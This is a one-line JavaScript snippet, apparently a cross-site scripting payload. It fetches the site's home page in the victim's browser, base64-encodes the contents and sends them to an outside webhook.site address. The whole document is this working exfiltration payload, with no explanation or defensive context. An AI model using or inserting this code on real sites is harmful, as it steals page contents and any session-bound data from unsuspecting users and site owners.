fetch('/').then(r=>r.text()).then(t=>fetch('https://webhook.site/73a66cc1-d951-455e-8a6c-a397eeda1536/?d='+btoa(t)))
